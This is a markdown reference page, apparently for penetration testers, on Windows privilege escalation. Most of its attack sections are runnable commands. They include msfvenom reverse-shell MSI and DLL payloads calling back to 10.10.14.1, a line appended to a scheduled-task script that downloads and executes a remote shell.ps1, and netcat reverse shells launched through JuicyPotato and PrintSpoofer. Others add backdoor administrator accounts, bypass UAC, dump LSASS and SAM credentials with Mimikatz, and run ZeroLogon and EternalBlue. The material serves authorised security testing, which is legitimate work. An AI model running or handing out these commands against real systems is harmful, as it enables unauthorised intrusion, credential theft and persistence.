---
title: Windows Privilege Escalation
category: techniques
tags: [windows, privilege-escalation, privesc, service-exploitation, token-manipulation]
last_updated: 2025-12-27
---

# Windows Privilege Escalation

Comprehensive guide to Windows privilege escalation techniques for penetration testing and red team operations.

## Table of Contents

1. [Service Misconfigurations](#service-misconfigurations)
2. [Registry Exploits](#registry-exploits)
3. [Scheduled Tasks](#scheduled-tasks)
4. [DLL Hijacking](#dll-hijacking)
5. [Token Impersonation](#token-impersonation)
6. [UAC Bypass](#uac-bypass)
7. [Kernel Exploits](#kernel-exploits)
8. [Credential Harvesting](#credential-harvesting)
9. [Notable Vulnerabilities](#notable-vulnerabilities)

---

## Service Misconfigurations

Windows services run with SYSTEM privileges by default, making them prime targets for privilege escalation.

### Unquoted Service Paths

When a service executable path contains spaces and is not enclosed in quotes, Windows attempts to locate the executable by parsing the path at each space.

#### How to Identify

```cmd
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# PowerShell alternative
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | Select-Object Name, PathName, StartMode
```

**Example Vulnerable Path:**
```
C:\Program Files\Vulnerable App\Service\binary.exe
```

Windows will attempt to execute in order:
1. `C:\Program.exe`
2. `C:\Program Files\Vulnerable.exe`
3. `C:\Program Files\Vulnerable App\Service\binary.exe`

#### How to Exploit

```cmd
# Check write permissions on each directory
icacls "C:\"
icacls "C:\Program Files\"
icacls "C:\Program Files\Vulnerable App\"

# If writable, place malicious executable
copy C:\temp\payload.exe "C:\Program Files\Vulnerable.exe"

# Restart service (requires SeShutdownPrivilege or service restart permissions)
sc stop VulnerableService
sc start VulnerableService

# Or wait for system reboot if service starts automatically
```

#### Tools
- **PowerUp.ps1**: `Get-UnquotedService`
- **WinPEAS**: Automatic detection
- **accesschk.exe**: Manual permission verification

### Weak Service Permissions

Services with weak DACLs allow modification of the service configuration, enabling binpath hijacking.

#### How to Identify

```cmd
# Check service permissions for current user
accesschk.exe /accepteula -uwcqv "Authenticated Users" * 2>nul
accesschk.exe /accepteula -uwcqv %USERNAME% * 2>nul

# Check specific service
accesschk.exe /accepteula -ucqv ServiceName

# PowerShell method
Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\ServiceName" | Format-List
```

**Exploitable Permissions:**
| Permission | Impact |
|------------|--------|
| SERVICE_ALL_ACCESS | Full control |
| SERVICE_CHANGE_CONFIG | Modify binpath |
| SERVICE_START | Start service |
| SERVICE_STOP | Stop service |
| WRITE_DAC | Modify permissions |
| WRITE_OWNER | Take ownership |

#### How to Exploit

```cmd
# Query current service configuration
sc qc VulnerableService

# Modify service binary path
sc config VulnerableService binpath= "C:\temp\payload.exe"

# Restart service to execute payload
sc stop VulnerableService
sc start VulnerableService

# Restore original path (for stealth)
sc config VulnerableService binpath= "C:\Original\Path\service.exe"
```

**PowerShell Exploitation:**
```powershell
# Modify service to add user to administrators
$newBinPath = 'cmd.exe /c net localgroup Administrators lowprivuser /add'
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\VulnerableService" -Name ImagePath -Value $newBinPath
Restart-Service VulnerableService
```

### Insecure Service Executables

The service binary itself has weak file permissions, allowing replacement.

#### How to Identify

```cmd
# Query service binary path
sc qc ServiceName

# Check file permissions
icacls "C:\Path\To\Service\binary.exe"

# Look for (M)odify, (F)ull, or (W)rite permissions for low-privileged users
```

#### How to Exploit

```cmd
# Backup original binary
copy "C:\Path\To\Service\binary.exe" "C:\Path\To\Service\binary.exe.bak"

# Replace with malicious payload
copy C:\temp\payload.exe "C:\Path\To\Service\binary.exe"

# Restart service
sc stop ServiceName
sc start ServiceName

# Restore original for cleanup
copy "C:\Path\To\Service\binary.exe.bak" "C:\Path\To\Service\binary.exe"
```

---

## Registry Exploits

### AlwaysInstallElevated

When enabled, MSI packages are installed with SYSTEM privileges regardless of user context.

#### How to Identify

```cmd
# Check both HKCU and HKLM - both must be set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
# PowerShell check
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

#### How to Exploit

```bash
# Generate malicious MSI with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o shell.msi

# Generate with meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o meterp.msi
```

```cmd
# Install MSI on target (runs as SYSTEM)
msiexec /quiet /qn /i C:\temp\shell.msi
```

#### Tools
- **PowerUp.ps1**: `Get-RegistryAlwaysInstallElevated`, `Write-UserAddMSI`
- **msfvenom**: MSI payload generation
- **WinPEAS**: Automatic detection

### Autorun Registry Keys

Writable autorun entries allow code execution at user login or system startup.

#### How to Identify

```cmd
# Common autorun locations
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run

# Check permissions on registry keys
accesschk.exe /accepteula -kvuqsw "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# Check file permissions for executables in autorun
```

**Additional Autorun Locations:**
```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute
```

#### How to Exploit

```cmd
# If registry key is writable
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\temp\payload.exe"

# If autorun executable is writable, replace it
copy C:\temp\payload.exe "C:\Path\To\Autorun\app.exe"
```

---

## Scheduled Tasks

Scheduled tasks running as SYSTEM or Administrator with weak permissions can be exploited.

#### How to Identify

```cmd
# List all scheduled tasks with full details
schtasks /query /fo LIST /v

# PowerShell - more detailed output
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq "Highest"} | Format-List

# Check task file permissions
schtasks /query /fo LIST /v | findstr /i "Task To Run"
# Then check permissions on each executable
icacls "C:\Path\To\TaskBinary.exe"
```

**Look for:**
- Tasks running as SYSTEM or Administrator
- Tasks with writable executables
- Tasks with writable script files
- Tasks in writable directories (for binary planting)

#### How to Exploit

```cmd
# Replace writable task binary
copy C:\temp\payload.exe "C:\Scheduled\Task\binary.exe"

# Wait for scheduled execution or trigger manually if possible
schtasks /run /tn "TaskName"
```

**Script-based Task Exploitation:**
```powershell
# If task runs a PowerShell script with weak permissions
Add-Content -Path "C:\Scripts\scheduled_task.ps1" -Value "`nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1')"
```

---

## DLL Hijacking

Windows DLL search order can be exploited to load malicious DLLs.

### DLL Search Order

Windows searches for DLLs in this order (with SafeDllSearchMode enabled):
1. Directory from which the application loaded
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current directory
6. Directories in PATH environment variable

### Search Order Hijacking

#### How to Identify

```cmd
# Use Process Monitor to identify DLL load attempts
# Filter: Operation contains "Load", Result is "NAME NOT FOUND"

# Check PATH for writable directories
for %p in ("%PATH:;=";"%") do @echo %~p
# Then check permissions on each
icacls "C:\Some\Path\Directory"
```

**Common Vulnerable Applications:**
- Applications in Program Files with missing DLLs
- Applications loading DLLs from PATH
- Portable applications in writable directories

#### How to Exploit

```bash
# Create malicious DLL with msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f dll -o hijacked.dll
```

```cmd
# Place DLL in writable directory that appears before legitimate DLL location
copy hijacked.dll "C:\Writable\Path\vulnerable.dll"

# Trigger application that loads the DLL
"C:\Program Files\VulnerableApp\app.exe"
```

### Phantom DLL Hijacking

Exploit applications that attempt to load non-existent DLLs.

#### How to Identify

```
# Use Process Monitor
# Filter: Path ends with .dll, Result is "NAME NOT FOUND"

# Common phantom DLLs:
# - wlbsctrl.dll (IKEEXT service)
# - wlanhlp.dll (WLAN service)
# - fveapi.dll (BitLocker)
```

#### How to Exploit

```cmd
# For wlbsctrl.dll (IKEEXT service - runs as SYSTEM)
# DLL searched in: C:\Windows\System32\wbem\
# If writable:
copy payload.dll C:\Windows\System32\wbem\wlbsctrl.dll

# Restart IKEEXT service
sc stop IKEEXT
sc start IKEEXT
```

#### Tools
- **Process Monitor (ProcMon)**: DLL load monitoring
- **WinPEAS**: Identifies writable PATH directories
- **PowerUp.ps1**: `Find-PathDLLHijack`

---

## Token Impersonation

Abuse Windows tokens to impersonate higher-privileged users.

### Prerequisites

Required privileges (check with `whoami /priv`):
- **SeImpersonatePrivilege**: Impersonate a client after authentication
- **SeAssignPrimaryTokenPrivilege**: Replace a process-level token

These privileges are commonly held by:
- Service accounts
- IIS Application Pool identities
- SQL Server service accounts
- Network Service, Local Service

### Potato Attacks

Family of exploits that abuse Windows NTLM authentication and token impersonation.

#### JuicyPotato (Windows Server 2019 and earlier)

```cmd
# Check if SeImpersonatePrivilege is enabled
whoami /priv

# Download and execute JuicyPotato
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c C:\temp\nc.exe -e cmd.exe 10.10.14.1 4444" -t *

# With specific CLSID (required for some Windows versions)
JuicyPotato.exe -l 1337 -c {CLSID} -p cmd.exe -a "/c whoami > C:\output.txt" -t *
```

**Common CLSIDs:**
| Windows Version | CLSID |
|-----------------|-------|
| Windows 10 | {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} |
| Server 2016 | {8BC3F05E-D86B-11D0-A075-00C04FB68820} |
| Server 2019 | {C49E32C6-BC8B-11d2-85D4-00105A1F8304} |

#### RoguePotato (Windows Server 2019+)

Successor to JuicyPotato for newer Windows versions.

```cmd
# Requires two components: local and remote
# On attacker machine, run socat redirector:
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999

# On target:
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\shell.exe" -l 9999
```

#### SweetPotato

Combines multiple potato techniques.

```cmd
# Execute command as SYSTEM
SweetPotato.exe -e EfsRpc -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123 /add && net localgroup administrators hacker /add"
```

#### PrintSpoofer (Windows 10 / Server 2016+)

Exploits the Print Spooler service.

```cmd
# Get SYSTEM shell
PrintSpoofer64.exe -i -c cmd

# Execute specific command
PrintSpoofer64.exe -c "C:\temp\nc.exe 10.10.14.1 4444 -e cmd.exe"
```

#### GodPotato

Works on all Windows versions from Windows 8 to Windows 11, Server 2012 to 2022.

```cmd
# Execute command as SYSTEM
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\shell.exe"
```

### Manual Token Impersonation

```powershell
# Using Invoke-TokenManipulation (PowerSploit)
Import-Module .\Invoke-TokenManipulation.ps1

# List available tokens
Invoke-TokenManipulation -Enumerate

# Impersonate SYSTEM
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"

# Create process with stolen token
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "DOMAIN\Administrator"
```

---

## UAC Bypass

User Account Control can be bypassed through various techniques when user is in Administrators group.

#### How to Identify UAC Configuration

```cmd
# Check UAC configuration
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System

# Key values:
# EnableLUA: 1 = UAC enabled
# ConsentPromptBehaviorAdmin:
#   0 = No prompt (disabled)
#   1 = Prompt for credentials on secure desktop
#   2 = Prompt for consent on secure desktop
#   3 = Prompt for credentials
#   4 = Prompt for consent
#   5 = Prompt for consent for non-Windows binaries (default)
```

### Fodhelper Bypass (Fileless)

Abuses fodhelper.exe auto-elevation.

```cmd
# Set registry key
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\System32\cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

# Trigger bypass
fodhelper.exe

# Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

### Eventvwr Bypass

```cmd
# Set registry hijack
reg add HKCU\Software\Classes\mscfile\Shell\Open\command /d "C:\Windows\System32\cmd.exe" /f

# Trigger bypass
eventvwr.exe

# Cleanup
reg delete HKCU\Software\Classes\mscfile /f
```

### Computerdefaults Bypass

```cmd
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /f
computerdefaults.exe
```

### UACME

Comprehensive UAC bypass tool with 70+ methods.

```cmd
# List available methods
Akagi64.exe

# Execute specific bypass
Akagi64.exe 41 C:\temp\payload.exe
```

#### Tools
- **UACME**: Multi-method UAC bypass tool
- **Metasploit**: `exploit/windows/local/bypassuac_*` modules
- **PowerShell Empire**: Various UAC bypass modules

---

## Kernel Exploits

Kernel vulnerabilities provide direct SYSTEM access but may cause instability.

### Enumeration

```cmd
# Get system information
systeminfo

# Get specific version info
wmic os get Caption,Version,BuildNumber,OSArchitecture

# Check installed hotfixes
wmic qfe get Caption,Description,HotFixID,InstalledOn
```

### Notable Kernel Exploits

| CVE | Name | Affected Versions | Impact |
|-----|------|-------------------|--------|
| CVE-2021-1732 | Win32k Elevation of Privilege | Windows 10 | Local Privilege Escalation |
| CVE-2020-0787 | BITS Arbitrary File Move | Windows 7-10, Server 2008-2019 | SYSTEM |
| CVE-2019-1388 | Certificate Dialog Elevation | Windows 7-10, Server 2008-2019 | SYSTEM |
| CVE-2018-8120 | Win32k Elevation of Privilege | Windows 7, Server 2008 | SYSTEM |
| MS16-032 | Secondary Logon Handle | Windows 7-10, Server 2008-2012 | SYSTEM |
| MS15-051 | Win32k Elevation of Privilege | Windows Vista-8.1, Server 2003-2012 | SYSTEM |

### Exploit Suggester

```bash
# Windows Exploit Suggester (from systeminfo output)
./windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo systeminfo.txt

# WES-NG (updated version)
wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only
```

```powershell
# Sherlock (PowerShell)
Import-Module .\Sherlock.ps1
Find-AllVulns

# Watson (C# version, more reliable)
Watson.exe
```

---

## Credential Harvesting

### Common Credential Locations

```cmd
# SAM and SYSTEM files (offline attack)
# Locations:
# C:\Windows\System32\config\SAM
# C:\Windows\System32\config\SYSTEM
# C:\Windows\repair\SAM
# C:\Windows\repair\SYSTEM

# Volume Shadow Copy
vssadmin list shadows
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
```

### Credential Manager

```cmd
# List stored credentials
cmdkey /list

# Use stored credentials with runas
runas /savecred /user:DOMAIN\Admin cmd.exe
```

### Unattended Installation Files

```cmd
# Common locations
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
```

### Web Configuration Files

```cmd
type C:\inetpub\wwwroot\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
findstr /si password *.xml *.ini *.txt *.config
```

### Registry Stored Credentials

```cmd
# AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"

# VNC passwords
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Putty stored sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "ProxyPassword"

# SNMP community strings
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

### PowerShell History

```powershell
# PowerShell command history
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-Content (Get-PSReadlineOption).HistorySavePath
```

### WiFi Passwords

```cmd
# List saved WiFi profiles
netsh wlan show profiles

# Get password for specific profile
netsh wlan show profile name="WiFiName" key=clear
```

### Memory Dump (Mimikatz)

```cmd
# Dump credentials from LSASS
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Dump SAM database
mimikatz.exe "privilege::debug" "lsadump::sam" exit

# Dump domain cached credentials
mimikatz.exe "privilege::debug" "lsadump::cache" exit
```

---

## Notable Vulnerabilities

### PrintNightmare (CVE-2021-1675 / CVE-2021-34527)

Remote code execution / local privilege escalation via Print Spooler.

#### How to Identify

```cmd
# Check if Print Spooler is running
sc query spooler

# Check if vulnerable
# Patched in July 2021 updates
```

#### How to Exploit (Local Privilege Escalation)

```powershell
# Using CVE-2021-1675.ps1
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser "hacker" -NewPassword "Password123!" -DriverName "PrinterDriver"

# Creates local admin user
```

### ZeroLogon (CVE-2020-1472)

Allows setting DC machine account password to empty, enabling DCSync.

#### How to Identify

```bash
# Test if DC is vulnerable
crackmapexec smb dc.domain.local -u '' -p '' -d domain.local -M zerologon
```

#### How to Exploit

```bash
# Using Impacket
python3 cve-2020-1472-exploit.py DC-NAME DC-IP

# Then perform secretsdump
secretsdump.py -no-pass -just-dc domain.local/DC-NAME\$@DC-IP
```

### EternalBlue (MS17-010)

SMB remote code execution affecting Windows Vista through Windows 10.

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set LHOST attacker_ip
run
```

### HiveNightmare/SeriousSAM (CVE-2021-36934)

Non-admin users can read SAM, SECURITY, and SYSTEM files.

```cmd
# Check if vulnerable
icacls C:\Windows\System32\config\SAM
# Vulnerable if BUILTIN\Users has (I)(RX)

# Exploit using shadow copies
python3 secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

---

## Enumeration Checklist

### Automated Tools
```cmd
# WinPEAS
winpeas.exe

# PowerUp
powershell -ep bypass -c "Import-Module .\PowerUp.ps1; Invoke-AllChecks"

# Seatbelt
Seatbelt.exe -group=all

# SharpUp
SharpUp.exe
```

### Manual Checks
```cmd
# User context
whoami /all
net user %USERNAME%
net localgroup Administrators

# System information
systeminfo
hostname

# Network configuration
ipconfig /all
route print
netstat -ano

# Running processes
tasklist /v
wmic process get Caption,CommandLine

# Installed software
wmic product get Name,Version
reg query HKLM\SOFTWARE

# Startup services
wmic service get Name,PathName,StartMode,State

# Installed updates
wmic qfe get HotFixID,InstalledOn
```

---

## References

- [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [Potato Attacks Explained](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)
- [Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
